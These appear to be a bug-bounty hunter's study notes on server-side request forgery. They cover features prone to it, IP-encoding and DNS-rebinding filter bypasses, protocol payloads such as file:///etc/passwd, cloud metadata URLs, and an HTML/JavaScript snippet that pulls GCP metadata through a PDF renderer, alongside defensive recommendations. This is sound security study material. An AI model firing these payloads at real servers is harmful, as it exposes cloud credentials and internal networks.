
# Server Side Request Forgery (SSRF)

Tricking a server to make a request on your behalf. Possible through signature forgery, allowing attackers to presume a privileged position, bypass firewall controls, and gain access to internal networks.

# Common features that are often vulnerable to server-side request forgeries:
**Profile image loaders** (often allowing users to specify a URL)
**Webhook services** & external data processors
PDF generators
Unrestricted file uploads (via an XML file for example)
CORS proxies (used to bypass CORS browser restrictions)
Request header processing (such as the Host or X-Forwarded-For request header)

## Cloud Metadata Endpoints
http://169.254.169.254/latest/meta-data
[JHaddix](https://gist.github.com/jhaddix/78cece26c91c6263653f31ba453e273b)

[Getting SSRF in Gitlab through Host Header Injecting](https://hackerone.com/reports/398799)

## Prevention
- Implement Allow/Block lists

## Hunting SSRF
1. **Review source code** - Examine how it validates user-provided URLs/request parameters
2. **Test endpoints** - Focus on those potentially prone to SSRF vulnerabilities

## Achieving SSRF through protocol change 
Put a server on [Test SSRF Server](https://ssrf.fly.dev) to test this 
[DoyenSec](https://blog.doyensec.com/2023/03/16/ssrf-remediation-bypass.html)

### 1. Spot Features Prone to SSRF
- Webhooks
- File uploads
- Proxy services
- Link and thumbnail expansions
- URLs embedded in files and processed (XML, PDF)
- API endpoints that accept URLs
- Websites allowing users to set up webhook URLs

**Action:** Notice these features on target sites and record them.

### 2. Provide Potentially Vulnerable Endpoints with Internal URLs

### 3. Check the Results
- Use a domain with logging access (provide in SSRF payload and monitor server logs)
- Use Netcat as listener
- Note: Outbound request alone isn't enough for exploitation
- Port scan internal network for unexpectedly open ports

**Indicator:** Significant time differences between requests to different ports may indicate exploitable SSRF.

## Bypassing SSRF Protections

### Circumvent Allow Lists
[Omise SSRF leveraging open redirects](https://hackerone.com/reports/508459)
- Find Open Redirect vulnerability on allowlisted URL and pass `redirect_to` parameter to internal server/IP
- Check implementation - regex-based allow lists might be improperly configured

### Circumvent Block Lists
1. **Redirect through controlled server**  
   If a loosely-scoped regex pattern is used for validation, we can bypass it by matching it.
   > Eg: https://assets.example.com.attacker.com/
   [Leveraging redir](https://www.leviathansecurity.com/blog/bypassing-ssrf-filters-using-r3dir)
   Make server request your URL that redirects to blocked address.
   Through DNS rebinding

2. **IPv6 addresses**  
   Protection might not cover IPv6 (e.g., `::1` = localhost, `fc00::` = private network)

3. **DNS tricks**  
   - A records (IPv4)  
   - AAAA records (IPv6)  
   - nslookup rasheedstarlet.com -type=AAAA
   
### Switching Out the Encoding
4. **Encoding methods** (may bypass blocklists):
- Hex: `https://0x7f.0x0.0x0.0x1`
- Octal: `https://0177.0.0.01`
- Dword: `https://2130706433`
- URL encoding: `https://%6c%6f%63%61%6c%68%6f%73%74`

**Tip:** When stuck, consider how you'd implement protection and look for gaps.

These encoding methods don’t change how a server interprets the location of the address, 
but they might allow the input to slip under the radar of a blocklist if it bans only 
addresses that are encoded a certain way.
hex encoding, octal encoding, dword encoding, URL encoding, and mixed encoding.
hex eg https://public.example.com/proxy?url=https://0x7f.0x0.0x0.0x1
oct eg https://public.example.com/proxy?url=https://0177.0.0.01
dword eg https://public.example.com/proxy?url=https://2130706433
enc eg https://public.example.com/proxy?url=https://%6c%6f%63%61%6c%68%6f%73%74

This is just a small portion of bypasses you can try. 
You can use many more creative ways to defeat protection and achieve SSRF. 
When you can’t find a bypass that works, switch your perspective by asking yourself, 
how would I or ChatGPT implement a protection mechanism for this feature? 
Design what you think the protection logic would look like.

## Switching Protocols 
LDAP: url=ldap://localhost:11211/%0astats%0aquit.
TFTP: url=tftp://generic.com:12346/TESTUDPPACKET
SFTP: url=sftp://generic.com:11111/
dict: dict://<generic_user>;<auth>@<generic_host>:<port>/d:<word>:<database>:<n>
file: file:///etc/passwd
[Gopher:](https://book.hacktricks.wiki/en/pentesting-web/ssrf-server-side-request-forgery/index.html#gopher)

## CURL URL Globbing
> file:///app/public/{.}./{.}./{app/public/hello.html,flag.txt}

### SSRF via Referrer header & Others and even Host Headers sometimes

## SSRF via SNI data from certificate
```
stream {
    server {
        listen 443;
        resolver 127.0.0.11;
        proxy_pass $ssl_preread_server_name:443;
        ssl_preread on;
    }
}
```
> openssl s_client -connect target.com:443 -servername "internal.host.com" -crlf

## XSS -> SSRF in server-side PDF rendering 
[Server Side XSS -> SSRF in PDF](https://book.hacktricks.wiki/en/pentesting-web/xss-cross-site-scripting/server-side-xss-dynamic-pdf.html)

## Escalating the Attack

### Network Scanning
Send requests to endpoints+ports and analyze responses to discover open/closed ports.

### Pull Instance Metadata
Default-accessible API endpoints (unless explicitly blocked):
- AWS: `http://169.254.169.254/latest/meta-data/`
- AWS: `http://2852039166/latest/meta-data/` Decimal Form
- GCP: `https://cloud.google.com/compute/docs/storing-retrieving-metadata/`
https://public.example.com/proxy?url=http://169.254.169.254/latest/meta-data/


### Exploit Blind SSRFs
Limited to:
- Network mapping
- Port scanning
- Service discovery

## Finding Your First SSRF
1. Identify SSRF-prone features
2. Set up callback listener (Netcat, Burp Collaborator, etc.)
3. Test endpoints with internal addresses/listener URL
4. Check for confirming responses or listener hits
5. If protected, attempt bypass techniques
6. Escalate the SSRF
7. Document findings

## Additional Resources
- [PayloadsAllTheThings SSRF](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery)
- [SSRF Bypass Cheat Sheet](https://portswigger.net/web-security/ssrf/url-validation-bypass-cheat-sheet)

> https://A.178.62.122.208.1time.127.0.0.1.1time.repeat.rebind.network/webhook5
[Whonow](https://github.com/brannondorsey/whonow)
[Omise DNS Rebinding SSRF](https://hackerone.com/reports/1379656)

---

## SSRF via Embeds and Iframes in PDFs
[SSRF in Real Life](https://www.cruxsecurity.ai/blog/tech-deep-dive/ssrf-in-real-life)
You can test local file inclusion too
```
<h1>SSRF test</h1>
<div>http://169.254.169.254/latest/meta-data/</div>
<div>
  <embed src="http://169.254.169.254/latest/meta-data/" style="width:100%;height:300px" />
</div>
```

## Google Cloud Platform (GCP)
To access the GCP instance metadata the following header needs to be included in the GET request:
> Metadata-Flavor: Google
```
<p>
  <div>Exfiltrated data:</div>
  <span id='result'></span>
  <script>
    exfil = new XMLHttpRequest();
    exfil.onreadystatechange = function () {
      if (exfil.readyState === 4) {
        document.getElementById("result").innerText = JSON.stringify(exfil.response);
      }
    };
    exfil.open("GET", "http://metadata.google.internal/computeMetadata/v1/instance/hostname");
    exfil.setRequestHeader("Metadata-Flavor", "Google");
    exfil.send();
  </script>
</p>```
## IP Representation Cheatsheet

### Standard Forms
localhost
127.0.0.1

### Alternative Representations
| Type        | Example             | Notes                          |
|-------------|---------------------|--------------------------------|
| Decimal     | 2130706433          | Decimal of 127.0.0.1           |
| Octal       | 017700000001        | Octal of 127.0.0.1             |
| Hexadecimal | 0x7f000001          | Hex of 127.0.0.1               |
| Mixed       | 127.1, 127.0.1      | Variations of 127.0.0.1        |
|             | 0x7f.0.0.1          | Mixed hex and decimal          |
[IP Address Variations](https://ma.ttias.be/theres-more-than-one-way-to-write-an-ip-address/)
[URL Validation By pass toolkit](https://portswigger.net/web-security/ssrf/url-validation-bypass-cheat-sheet)

### IPv6 Variants
[::1] # loopback
::ffff:127.0.0.1 # IPv4-mapped IPv6
%5B::1%5D # URL-encoded [::1]


### Hostname Tricks
localhost.localdomain
ip6-localhost
127.0.0.1.xip.io # Public services resolving to loopback

### Defense Recommendations
[Convoy's Defense In Depth](https://www.getconvoy.io/docs/webhook-guides/tackling-ssrf)

1. Canonicalize IP/hostnames before validation
2. Block internal IP ranges:
   - 127.0.0.0/8
   - 10.0.0.0/8
   - 172.16.0.0/12
   - 192.168.0.0/16
   - ::1, fc00::/7
3. Avoid raw user-provided URLs - use whitelisted domains or fetch by ID

Example exploitation:
+ Network scanning
sending req to end points + ports and noting the returned results to
discover opened and closed ports 

+ Pull Instance Metadata
These API endpoints are accessible by default unless network admins
specifically block or disable them. The information these services reveal is
often extremely sensitive and could allow attackers to escalate SSRFs to 
serious information leaks and even RCE.  
For example, this API request fetches all instance metadata from the running instance:
http://169.254.169.254/latest/meta-data/
Use this URL in an endpoint vulnerable to SSRF:
https://public.example.com/proxy?url=http://169.254.169.254/latest/meta-data/

https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/ec2-instance-metadata.html.

https://cloud.google.com/compute/docs/storing-retrieving-metadata/

+ Exploit Blind SSRFs
Because blind SSRFs don’t return a response or error message, 
their exploitation is often limited to network mapping, 
port scanning, and service discovery

Finding Your First SSRF!
Let’s review the steps you can take to find your first SSRF:
1. Spot the features prone to SSRFs and take notes for future reference.
2. Set up a callback listener to detect blind SSRFs by using an online service, 
Netcat, or Burp’s Collaborator feature.
3. Provide the potentially vulnerable endpoints with common internal
addresses or the address of your callback listener.
4. Check if the server responds with information that confirms the SSRF.
Or, in the case of a blind SSRF, check your server logs for requests from
the target server, check if the server behavior differs when you request different hosts or ports.
6. If SSRF protection is implemented, try to bypass it by using the strategies discussed in this chapter.
7. Pick a tactic to escalate the SSRF.
8. Draft your first SSRF report!

Extra https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery


Decimal, Octal, Hex, and Other Representations
🔹 Standard forms
localhost
127.0.0.1

🔹 Decimal
2130706433
(This is 127*256^3 + 0*256^2 + 0*256 + 1 — the decimal of 127.0.0.1)

🔹 Octal
017700000001
(Octal representation of 127.0.0.1)

🔹 Hexadecimal
0x7f000001
(Hex of 127.0.0.1)

🔹 Mixed or Dword IPs
127.1
127.0.1
127.000.000.001
127.000000001
0x7f.0.0.1
127.1.2.3 (if the filter only blocks exact 127.0.0.1)

✅ IPv6 Variants
[::1] – loopback address
::ffff:127.0.0.1 – IPv4-mapped IPv6 address
%5B::1%5D – URL-encoded [::1]

✅ Hostname Tricks
localhost.localdomain
ip6-localhost
localhost. (trailing dot)
127.0.0.1.xip.io, 
127.0.0.1.sslip.io (public services that resolve to loopback)

⚠️ Defenses Against SSRF Bypass
To mitigate these tricks:
Canonicalize the IP/hostname before validation:
Use getaddrinfo() or inet_aton() to resolve and normalize.
Reject requests that resolve to loopback/internal/private ranges.

Deny internal IP ranges: Block these ranges:
127.0.0.0/8
10.0.0.0/8
172.16.0.0/12
192.168.0.0/16
::1, fc00::/7, etc.

Don't allow raw URLs from users. Instead, use whitelisted domains or fetch by ID.

Replace example.com with target domain 
Replace web-attacker.com with oast.fun domain name 
https://portswigger.net/web-security/ssrf/url-validation-bypass-cheat-sheet





